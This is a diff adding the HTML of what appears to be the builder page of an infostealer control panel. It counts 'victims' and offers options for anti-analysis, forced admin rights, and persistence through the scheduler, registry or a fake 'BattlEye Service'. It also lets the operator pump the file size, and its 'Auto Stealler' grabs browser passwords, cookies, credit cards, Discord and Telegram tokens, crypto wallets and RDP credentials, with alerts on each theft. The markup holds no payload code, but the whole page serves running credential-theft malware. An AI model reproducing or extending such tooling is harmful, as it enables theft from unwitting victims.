@@ -1,0 +1,722 @@
+<script src="pages/jszip.min.js"></script>
+<script src="pages/builder.js"></script>
+<script src="pages/pizda.js"></script>
+<script src="pizda.js"></script>
+<div class="headinfo">
+    </div>
+<script>
+
+</script>
+<div id="backblur" onclick="closebuildconfigsmenu();closedelitebuild(); $('.mainpopup').hide(); $('.confirmpopup').hide();">
+</div>
+
+
+<div class="buildheader">
+    <!-- <img type="image/svg+xml" src="image/sliders.svg" width="27" height="27" class="buttonsheader" onclick="showbuildconfigsmenu()" style="margin-right:5px; " title="configs">
+<img type="image/svg+xml" src="image/file-plus-minus.svg" width="27" height="27" class="buttonsheader" onclick="showfilterwindow()" style="margin-right:10px;" title="build management"> -->
+
+    <div class="headselectorbutton headselectorbuttonactive" onclick="headsel('.pagemanager',this);"><b>builds</b>
+
+    </div>
+    <!-- <div class="headselectorbutton" onclick="headsel('.pagebuilder',this);"><b>builder</b></div> -->
+
+    <script>
+        function headsel(el, t) {
+            $(".pagemanager").eq(0).hide();
+            $(".pagebuilder").eq(0).hide();
+            $(el).eq(0).show();
+            $(".headselectorbutton").eq(0).removeClass("headselectorbuttonactive");
+            $(".headselectorbutton").eq(1).removeClass("headselectorbuttonactive");
+            $(t).addClass("headselectorbuttonactive");
+
+        }
+    </script>
+
+
+
+    <div id="buildmanagermenu">
+    </div>
+    <script>
+        function showbuildconfigsmenu() {
+            $("#backblur").show();
+            $("#buildconfigsmenu").show();
+        }
+        function closebuildconfigsmenu() {
+            $("#backblur").hide();
+            $("#buildconfigsmenu").hide();
+        }
+    </script>
+
+
+</div>
+
+
+
+<div class="pagemanager" style="height: 100%;">
+
+    <div id="delitebuild">
+        <img onclick="closedelitebuild()" type="image/svg+xml" src="image/square-xmark.svg" width="27" height="27"
+            class="closebutton">
+        <pre>
+    <b>This action cannot be undone</b>
+
+    You will lose 22 victims FOREVER    <br>
+    Are you sure?  
+    </pre>
+        <div style="display:flex; margin-left:30%; margin-top:10px;">
+            <div class="button1" style="color:red;"><b>
+                    Yes                </b></div>
+            <div class="button1" style="color:green;" onclick="closedelitebuild()"><b>
+                    No                </b></div>
+        </div>
+    </div>
+    <div id="setbuild">
+
+    </div>
+    <div class="mainpopup" style="height: fit-content; padding-bottom: 10px;" id="buildinfo">
+        <div class="pophead">
+            <div class="popname">
+                <b>Build info</b>
+            </div>
+            <svg class="closebutton" onclick="$('.mainpopup').hide();$('#backblur').hide();"
+                xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" viewBox="0 0 384 512">
+                <path
+                    d="M324.5 411.1c6.2 6.2 16.4 6.2 22.6 0s6.2-16.4 0-22.6L214.6 256 347.1 123.5c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L192 233.4 59.5 100.9c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6L169.4 256 36.9 388.5c-6.2 6.2-6.2 16.4 0 22.6s16.4 6.2 22.6 0L192 278.6 324.5 411.1z">
+                </path>
+            </svg>
+        </div>
+        <div class="">
+            <center>
+                <table style="margin-top: 10px">
+                    <thead>
+
+                    </thead>
+                    <tbody class="tablebox2">
+                        <tr class="tableel">
+                            <td>ID:</td>
+                            <td id="buildinfohwid"></td>
+                            <td>User count:</td>
+                            <td id="buildinfousercount"></td>
+                        </tr>
+                        <tr class="tableel">
+                            <td>Name:</td>
+                            <td id="buildinfoname"></td>
+                            <td>Mutex:</td>
+                            <td id="buildinfomutex"></td>
+                        </tr>
+                        <tr class="tableel">
+                            <td>Version:</td>
+                            <td id="buildinfoversion">
+                            <td>Install:</td>
+                            <td id="buildinfoinstall"></td>
+                            </td>
+                        </tr>
+                        <tr class="tableel">
+                            <td>Comment:</td>
+                            <td id="buildinfocomment"></td>
+                            <td>Copy count:</td>
+                            <td id="buildinfoinstallcount"></td>
+                        </tr>
+                        <tr class="tableel">
+                            <td>Color:</td>
+                            <td id="buildinfocolor"></td>
+                            <td>Autorun:</td>
+                            <td id="buildinfoautorun"></td>
+                        </tr>
+                        <tr class="tableel">
+                            <td>Created:</td>
+                            <td id="buildinfocreated"></td>
+                            <td>Autosteal:</td>
+                            <td id="buildinfoautosteal"></td>
+                        </tr>
+                        <tr class="tableel">
+                            <td>Force adm:</td>
+                            <td id="buildforceadmin"></td>
+                        </tr>
+                        <tr class="tableel">
+                            <td>Anti-VPS:</td>
+                            <td id="buildinfoantivps" class="">
+                                <select class="selector" id="antivpsinfo" onchange="changeantivps()" style="">
+                                    <option>
+                                        enabled
+                                    </option>
+                                    <option>
+                                        disabled
+                                    </option>
+                                </select>
+                            </td>
+                            <td>Anti-Mitm:</td>
+                            <td id="buildforceantimitm"></td>
+                        </tr>
+                    </tbody>
+                </table>
+            </center>
+        </div>
+    </div>
+
+    <div class="mainpopup" id="bilderscriptspopup" style="display:none; padding: 2px;">
+        <div class="pophead">
+            <div class="popname">
+                <b>Scripts</b>
+            </div>
+            <div class="popname" style="cursor: pointer;" onclick="window.location.href='index.html#scripts'; location.reload();">open scripts manager</div>
+            <svg class="closebutton" onclick="$('.mainpopup').hide();$('#backblur').hide();"
+                xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" viewBox="0 0 384 512">
+                <path
+                    d="M324.5 411.1c6.2 6.2 16.4 6.2 22.6 0s6.2-16.4 0-22.6L214.6 256 347.1 123.5c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L192 233.4 59.5 100.9c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6L169.4 256 36.9 388.5c-6.2 6.2-6.2 16.4 0 22.6s16.4 6.2 22.6 0L192 278.6 324.5 411.1z">
+                </path>
+            </svg>
+
+        </div>
+        <div id="builderscripts">
+
+        </div>
+    </div>
+
+        <div class="bilderblock" id="bilderblock">
+        <div class="buildcreatebut" id="buildcreatebut" onclick="showbuilderwindow();">
+            <p>
+                Create new build            </p>
+        </div>
+        <div class="buildcreatebut" id="buildslosebut" style="display:none;" onclick="closebuilderwindow();">
+            <p>
+                Close builder
+            </p>
+        </div>
+        <div class="buildercontent" style="display:none;">
+            <div class="builderblock">
+                <table class="tablebox2" style="max-width: 100%; width: 100%; padding-bottom: 0px; background: 0;">
+                    <thead></thead>
+                    <tbody>
+                        <tr class="tableel2">
+                            <td rowspan="2" style="padding: 0; margin-bottom: -20px; vertical-align: middle;">
+                                <div class="overtablebox2" style="margin-bottom: 5px; margin: 15px;">
+                                    <input type="color" class="colorimp" value="#4fc0d2" id="Buildcolor"
+                                        style="margin-top: 0px; margin-left: 0px; width: 30px; height: 30px; border-radius: 10px;">
+                                </div>
+                            </td>
+                            <td>name</td>
+                            <td>
+                                <input id="Buildname" type="text" value="" placeholder="name">
+                            </td>
+                        </tr>
+                        <tr class="tableel2">
+                            <td>mutex</td>
+                            <td>
+                                <input id="Buildmutex" type="text" value="WEBR_R4R45YT45NJI6JN" placeholder="mutex">
+                            </td>
+                        </tr>
+
+                    </tbody>
+                </table>
+                <table class="tablebox2" style="max-width: 100%; width: 100%; padding-bottom: 0px; background: 0;">
+                    <thead></thead>
+                    <tbody>
+                        <tr class="tableel2">
+                            <td>Comment</td>
+                            <td>
+                                <input id="Buildtag" type="text" value="" placeholder="comment">
+                            </td>
+                        </tr>
+                        <tr class="tableel2" style="display:none">
+                            <td style="width: fit-content;">Start delay(S)</td>
+                            <td>
+                                <div class="raw">
+                                    <div class="number"> <button class="number-minus" type="button"
+                                            onclick="this.nextElementSibling.stepDown(); this.nextElementSibling.onchange();">-</button>
+                                        <input id="Builddelay" type="number" min="0" value="0"> <button
+                                            class="number-plus" type="button"
+                                            onclick="this.previousElementSibling.stepUp(); this.previousElementSibling.onchange();">+</button>
+                                    </div>
+                                </div>
+                            </td>
+                        </tr>
+                        <tr class="tableel2" style="">
+                            <td name="Antianal">Anti-analysis</td>
+                            <td>
+                                <select class="selector" id="antianal" onchange="autowarning();" style="">
+                                    <option>
+                                        None
+                                    </option>
+                                    <option>
+                                        Anti Mitm
+                                    </option>
+                                    <option>
+                                        Anti VPS
+                                    </option>
+                                    <option>
+                                        Full
+                                    </option>
+                                </select>
+                            </td>
+                        </tr>
+                        <tr class="tableel2" style="">
+                            <td name="extension">Extension</td>
+                            <td>
+                                <select class="selector" id="Buildexten" onchange="" style="">
+                                    <option target=".exe">
+                                        webbuild.exe
+                                    </option>
+                                    <!-- <option target=".com">
+                                        webbuild.com
+                                    </option>
+                                    <option target=".bat">
+                                        webbuild.bat
+                                    </option>
+                                    <option target=".cmd">
+                                        webbuild.cmd
+                                    </option>
+                                    <option target=".pif">
+                                        webbuild.pif
+                                    </option>
+                                    <option target=".scr">
+                                        webbuild.scr
+                                    </option> 
+                                    <option>
+                                        webbuild.dll
+                                    </option> -->
+                                </select>
+                            </td>
+                        </tr>
+                        
+                        <tr class="tableel2" style="display:none;">
+                            <td>Pump file (MB)</td>
+                            <td>
+                                <div class="raw">
+                                    <div class="number"> <button class="number-minus" type="button"
+                                            onclick="this.nextElementSibling.stepDown(); this.nextElementSibling.onchange();">-</button>
+                                        <input type="number" id="Buildpump" min="0" value="0"> <button
+                                            class="number-plus" type="button"
+                                            onclick="this.previousElementSibling.stepUp(); this.previousElementSibling.onchange();">+</button>
+                                    </div>
+                                </div>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+                <div id="antianalnotify" style="display: none;"><center><b style='color: red; font-size: 18px;'>Anti Mitm is not recomended.</b></center></div>
+                <center id="bottomblock" style="margin-top: 56px;">
+                    <a class="builddefault" style=""><b>(USERS MAY TAKE TO 5 MINUTES TO CONNECT)</b></a>
+                    <div style="display:flex;">
+                        <div class="button1" style="width: 200px; margin-top: 10px;" onclick=" createbuild()">Create
+                        </div>
+                        <div class="button1" style="width: 200px; margin-top: 10px;" onclick=" builderscriptsshow()">
+                            Scripts</div>
+                    </div>
+                </center>
+            </div>
+            <div class="builderblock">
+                <table class="tablebox2" style="max-width: 100%; width: 100%; padding-bottom: 0px; background: 0;">
+                    <thead></thead>
+                    <tbody>
+                        <tr class="tableel2" id="" style="">
+                            <td style="width: 120px;">Auto Steal</td>
+                            <td>
+                                <select class="selector" id="BuildautoSteal" onchange="installparmshow()" style="">
+                                    <option>
+                                        Once
+                                    </option>
+                                    <option>
+                                        None
+                                    </option>
+                                    <option>
+                                        Every connect
+                                    </option>
+                                </select>
+                            </td>
+                        </tr>
+                        <tr class="tableel2">
+                            <td>Force admin</td>
+                            <td>
+                                <select class="selector" id="Buildfadmin" onchange="autowarning();" style="">
+                                    <option>
+                                        Normal
+                                    </option>
+                                    <option>
+                                        Agressive
+                                    </option>
+                                    <option>
+                                        None
+                                    </option>
+                                </select>
+                            </td>
+                        </tr>
+                        <tr class="tableel2" id="">
+                            <td>Install</td>
+                            <td>
+                                <select class="selector" id="Buildinstall"
+                                    onchange="installparmshow(); autowarning(); autoranparmshow();" style="">
+                                    <option>
+                                        Random
+                                    </option>
+                                    <option>
+                                        None
+                                    </option>
+                                    <option>
+                                        Custom
+                                    </option>
+                                </select>
+                            </td>
+                        </tr>
+                        <tr class="tableel2" id="noneType" style="display: none;">
+                            <td colspan="2">
+                                <center><b>Build will not be added to autostart.</b></center>
+                            </td>
+                        </tr>
+                       
+                        <tr class="tableel2" id="randomType" style="">
+                            <td>Copy count</td>
+                            <td style="padding: 3px;">
+                                <div class="raw">
+                                    <div class="number"> <button class="number-minus" type="button"
+                                            onclick="this.nextElementSibling.stepDown(); this.nextElementSibling.onchange();">-</button>
+                                        <input type="number" disabled id="BuildinstallCount" min="1" max="10" value="2"> <button
+                                            class="number-plus" type="button"
+                                            onclick="this.previousElementSibling.stepUp(); this.previousElementSibling.onchange();">+</button>
+                                    </div>
+                                </div>
+                            </td>
+                        </tr>
+                        <tr class="tableel2" id="customType" style="display: none;">
+                            <td>Path</td>
+                            <td>
+                                <input type="text" id="buildPath" value="" placeholder="$AppData\build.exe">
+                            </td>
+                        </tr>
+                        <tr class="tableel2 setinstall" id="" style="">
+                            <td>Hide files</td>
+                            <td>
+                                <div style="margin-left: 20px;"> <input class="checkbox" id="Buildhidefile"
+                                        type="checkbox"></div>
+                            </td>
+                        </tr>
+                        <tr class="tableel2 setinstall" id="" style="">
+                            <td>Autorun</td>
+                            <td>
+                                <select class="selector" id="Buildautorun" onchange="autoranparmshow(); autowarning();" style="">
+                                    <option>
+                                        Scheduler
+                                    </option>
+                                    <option>
+                                        Scheduler + Registry
+                                    </option>
+                                    <option>
+                                        Registry
+                                    </option>
+                                    <!-- <option>
+                                        Service
+                                    </option> -->
+                                    <option>
+                                        None
+                                    </option>
+                                </select>
+                            </td>
+                        </tr>
+                        <tr class="tableel2" id="autorankeyType" style="display: none;">
+                            <td>Autorun Key</td>
+                            <td>
+                                <input type="text" id="BuildautorunKey" value="" placeholder="Autorun key">
+                            </td>
+                        </tr>
+                        <tr ><td colspan="2" id="autowarn"></td><td></td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+        <div style=" display: flex; justify-content: center; width: 100%" class="bildercontainer">
+            <div style="display:none;" id="bilderprogress" class="bilderprogress">
+
+            </div>
+        </div>
+    </div>
+    <center>
+        <div id="stubvershow" style="margin-bottom: 10px;" class="overtablebox2">
+            <div style="text-align: center; font-size: 20px; width: 508px;">
+                Current version of the stab: 1.2.0<b id="buildver"></b>
+            </div>
+        </div>
+    </center>
+    <div id="builds">
+
+    </div>
+</div>
+
+<div id="builderwindow" class="builderwindow">
+    <div class="pophead">
+        <div class="popname">
+            <b>Билдер</b>
+        </div>
+        <svg class="closebutton" onclick="closebuilderwindow()" xmlns="http://www.w3.org/2000/svg" width="25"
+            height="25" fill="currentColor" viewBox="0 0 384 512">
+            <path
+                d="M324.5 411.1c6.2 6.2 16.4 6.2 22.6 0s6.2-16.4 0-22.6L214.6 256 347.1 123.5c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L192 233.4 59.5 100.9c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6L169.4 256 36.9 388.5c-6.2 6.2-6.2 16.4 0 22.6s16.4 6.2 22.6 0L192 278.6 324.5 411.1z" />
+        </svg>
+    </div>
+    <div style="display:flex;">
+        <div>
+
+            <div class="buildblock" style="height:180px; width: 500px; border: 2px 2px 1px 1px black solid;">
+                <center>
+                    <div style="display: flex;">
+                        <input type="color" class="colorimp" value="#4fc0d2"
+                            style="margin-top: 8px; margin-left: 50px; width: 30px; height: 30px; border-radius: 10px;">
+                        <div>
+                            <div> tag
+                                <input id="filter13" type="text" value="" placeholder="tag"
+                                    style="margin-top: 10px; margin-left: 10px; margin-right: 40px; margin-bottom: 5px; width: 200px; ">
+                            </div>
+                            <div>mutex
+                                <input id="filter13" type="text" value="SUDO_R4R45YT45NJI6JN" placeholder="mutex"
+                                    style="margin-top: 10px; margin-left: 0px; margin-right: 10px; margin-bottom: 5px; width: 200px; ">
+                            </div>
+                        </div>
+                    </div>
+                    <div style="display: flex; margin-top:30px;">
+                        <div class="raw">
+                            Start delay
+                            <div class="number">
+                                <button class="number-minus" type="button"
+                                    onclick="this.nextElementSibling.stepDown(); this.nextElementSibling.onchange();">-</button>
+                                <input type="number" min="0" value="0">
+                                <button class="number-plus" type="button"
+                                    onclick="this.previousElementSibling.stepUp(); this.previousElementSibling.onchange();">+</button>
+                            </div>
+                        </div>
+
+                        <div style="margin-left: 20px; margin-top: 10px;">
+                            <input class="checkbox" type="checkbox"> <b>Inject process</b>
+                        </div>
+                    </div>
+
+                </center>
+            </div>
+
+
+            <div class="buildblock" style="height:280px; width: 500px;">
+
+                <div style="display: flex; margin-left:10px; margin-top:30px;">
+                    <div>
+                        <b>Path</b>
+                        <input id="filter13" type="text" value="C:\user\o4ka\abobka.exe" placeholder="mutex"
+                            style="margin-top: 10px;margin-left: 10px;margin-right: 0px;margin-bottom: 5px;width: 250px;"><svg
+                            xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" fill="currentColor"
+                            style="width: 18px; margin: 0 0 -3px -20px; color: var(--color1); ">
+                            <path
+                                d="M464 192c8.8 0 16-7.2 16-16V48c0-8.8-7.2-16-16-16s-16 7.2-16 16v92.6C408.8 75.5 337.5 32 256 32C132.3 32 32 132.3 32 256s100.3 224 224 224c79.9 0 150-41.8 189.7-104.8c6.6-10.4-1.4-23.2-13.7-23.2c-6 0-11.4 3.2-14.7 8.2C383.1 413 323.6 448 256 448C150 448 64 362 64 256S150 64 256 64c71.1 0 133.1 38.6 166.3 96H336c-8.8 0-16 7.2-16 16s7.2 16 16 16H464z">
+                            </path>
+                        </svg>
+                    </div>
+                    <div style="" title="">
+                        <input class="checkbox" type="checkbox"> Hide file
+                    </div>
+                </div>
+
+                <div style="display: flex;">
+                    <div style="margin-left: 20px; margin-right: 20px;" title="">
+                        <input class="checkbox" type="checkbox"> Autorun
+                    </div>
+
+                    <div>
+                        <b>Key</b>
+                        <input id="filter13" type="text" value="NvTmRepCrashReport" placeholder="mutex"
+                            style="margin-top: 10px; margin-left: 10px; margin-right: 10px; margin-bottom: 5px; width: 200px; "><svg
+                            xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" fill="currentColor"
+                            style="width: 18px; margin: 0 0 -3px -20px; color: var(--color1); ">
+                            <path
+                                d="M464 192c8.8 0 16-7.2 16-16V48c0-8.8-7.2-16-16-16s-16 7.2-16 16v92.6C408.8 75.5 337.5 32 256 32C132.3 32 32 132.3 32 256s100.3 224 224 224c79.9 0 150-41.8 189.7-104.8c6.6-10.4-1.4-23.2-13.7-23.2c-6 0-11.4 3.2-14.7 8.2C383.1 413 323.6 448 256 448C150 448 64 362 64 256S150 64 256 64c71.1 0 133.1 38.6 166.3 96H336c-8.8 0-16 7.2-16 16s7.2 16 16 16H464z">
+                            </path>
+                        </svg>
+
+                    </div>
+                </div>
+
+
+                <div style="margin-left: 20px; margin-right: 50px;" title="">
+                    <input class="checkbox" type="checkbox"> Force admin
+                </div>
+
+                <div style="margin-left: 20px; margin-right: 50px; margin-top: 20px;" title="">
+                    <input class="checkbox" type="checkbox"> Install windows service*
+                </div>
+                <div style="margin-left:40px;">
+                    <b>Servce name</b>
+                    <input id="filter13" type="text" value="BattlEye Service" placeholder="mutex"
+                        style="margin-top: 10px; margin-left: 10px; margin-right: 10px; margin-bottom: 5px; width: 200px; ">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" fill="currentColor"
+                        style="width: 18px; margin: 0 0 -3px -20px; color: var(--color1); ">
+                        <path
+                            d="M464 192c8.8 0 16-7.2 16-16V48c0-8.8-7.2-16-16-16s-16 7.2-16 16v92.6C408.8 75.5 337.5 32 256 32C132.3 32 32 132.3 32 256s100.3 224 224 224c79.9 0 150-41.8 189.7-104.8c6.6-10.4-1.4-23.2-13.7-23.2c-6 0-11.4 3.2-14.7 8.2C383.1 413 323.6 448 256 448C150 448 64 362 64 256S150 64 256 64c71.1 0 133.1 38.6 166.3 96H336c-8.8 0-16 7.2-16 16s7.2 16 16 16H464z">
+                        </path>
+                    </svg>
+
+                </div>
+            </div>
+        </div>
+        <div>
+
+            <div class="buildblock" style="height:280px; width: 500px;">
+                <center>
+                    <div style="margin-left: 20px; margin-top: 10px; margin-bottom: 20px;">
+                        <input class="checkbox" type="checkbox"> <b>Auto Stealler</b>
+                    </div>
+                </center>
+                <div style="display:flex; margin-bottom:20px;">
+                    <div>
+                        <center><b>Browsers</b></center>
+                        <div style="margin-left: 10px; ">
+                            <input class="checkbox" type="checkbox"> Grab Cookies/Passwords
+                        </div>
+                        <div style="margin-left: 0px;">
+                            <input class="checkbox" type="checkbox"> Grab Forms/CC
+                        </div>
+                        <div style="margin-left: 10px; ">
+                            <input class="checkbox" type="checkbox"> Grab Download/URL History
+                        </div>
+                    </div>
+                    <div>
+                        <center><b>Other</b></center>
+                        <div style="margin-left: 20px; ">
+                            <input class="checkbox" type="checkbox"> Grab Screenshot
+                        </div>
+                        <div style="margin-left: 10px;">
+                            <input class="checkbox" type="checkbox"> Grab Clipboard
+                        </div>
+                        <div style="margin-left: 20px;">
+                            <input class="checkbox" type="checkbox"> Grab System Info
+                        </div>
+                    </div>
+                </div>
+
+                <center><b>Clients</b></center>
+                <div style="display:flex;">
+                    <div>
+                        <div style="margin-left: 20px; margin-right: 50px;" title="TData,discord token">
+                            <input class="checkbox" type="checkbox"> Grab Social
+                        </div>
+                        <div style="margin-left: 20px; margin-right: 50px;" title="steam, blizzard">
+                            <input class="checkbox" type="checkbox"> Grab Game
+                        </div>
+                    </div>
+                    <div>
+                        <div style="margin-left: 20px; margin-right: 50px;" title="exodus, i td ">
+                            <input class="checkbox" type="checkbox"> Grab Cripto
+                        </div>
+                        <div style="margin-left: 20px; margin-right: 50px;" title="rdp, filezilla, winscp">
+                            <input class="checkbox" type="checkbox"> Grab Tools
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+
+
+
+            <div class="buildblock" style="height:180px; width: 500px; ">
+                <div style="display: flex; margin-top: 15px;">
+                    <div class="raw">
+                        Pump file
+                        <div class="number">
+                            <button class="number-minus" type="button"
+                                onclick="this.nextElementSibling.stepDown(); this.nextElementSibling.onchange();">-</button>
+                            <input type="number" min="0" value="10">
+                            <button class="number-plus" type="button"
+                                onclick="this.previousElementSibling.stepUp(); this.previousElementSibling.onchange();">+</button>
+                        </div>
+                        MB
+                    </div>
+                    <div style="margin-top: 12px; margin-left: 20px;">
+                        Extension
+                        <select class="selector">
+                            <option>.exe</option>
+                            <option>.com</option>
+                            <option>.bat</option>
+                            <option>.cmd</option>
+                            <option>.scr</option>
+                            <option>.msi</option>
+                            <option>.dll</option>
+                        </select>
+
+                    </div>
+                </div>
+
+
+                <div style="display: flex; justify-content: space-around; margin-top: 40px;">
+                    <div>
+                        <b>icon</b>
+                        <div class="buttonico"><img src="image/bico.png"> </div>
+                    </div>
+                    <div class="button1" style="margin-top:20px; padding-top:10px;"><b>build</b></div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+
+<div class="pagebuilder" style="display:none;">
+</div>
+
+<div class="mainpopup" id="newtrig">
+    <div class="pophead">
+        <div class="popname">
+            <b>New notification trigger</b>
+        </div>
+        <svg class="closebutton" onclick="$('.mainpopup').hide(); $('#backblur').hide();"
+            xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="currentColor" viewBox="0 0 384 512">
+            <path
+                d="M324.5 411.1c6.2 6.2 16.4 6.2 22.6 0s6.2-16.4 0-22.6L214.6 256 347.1 123.5c6.2-6.2 6.2-16.4 0-22.6s-16.4-6.2-22.6 0L192 233.4 59.5 100.9c-6.2-6.2-16.4-6.2-22.6 0s-6.2 16.4 0 22.6L169.4 256 36.9 388.5c-6.2 6.2-6.2 16.4 0 22.6s16.4 6.2 22.6 0L192 278.6 324.5 411.1z">
+            </path>
+        </svg>
+    </div>
+    <div style="display: flex; height: 85%;">
+        <div style="width: 50%; align-content: center;">
+            <center>
+                <div>Method</div>
+                <select class="methsel " id="methodsbuild" onchange="">
+                </select>
+            </center>
+
+            <center>
+                <div style="margin-top: 20px;">Event</div>
+                <select onchange="changenamebuildinbuilder()" class="othersel selector" id="notifyeventbuild" style="">
+                    <option>
+                        Steal
+                    </option>
+                    <option>
+                        Install
+                    </option>
+                    <option>
+                        Connect
+                    </option>
+                </select>
+            </center>
+            <center>
+                    <div style="display: inline-flex; margin-top: 20px;">
+                        <div><input class="checkbox" id="attachnotify" type="checkbox"></div>
+                        <lable style="margin-top: 7px;" id="notifygalkabuild">Attach Log</lable>
+                    </div>
+                </center>
+            <center>
+                <div>
+                    <input style="text-align:center; margin-top: 30px; margin-bottom: 20px;" id="buildhwid" type="text"
+                        value="" placeholder="build id">
+                </div>
+            </center>
+        </div>
+        <div style="width: 50%">
+            <textarea id="notifybuildtextarea" class="textareatrig" placeholder='Select the method !'
+                style="background: black; margin-top: 2px; color: azure; height:99%; resize: none; width:99%"></textarea>
+        </div>
+    </div>
+        <div class="bottombutton">
+            <center>
+                <div class="button1" onclick="notifycreate()" style="width: calc(100% - 24px);">Create trigger</div>
+            </center>
+        </div>
+<script src="pages/pizda.js"></script>
+<script src="pizda.js"></script>
+</div>
+</div>
+</div>
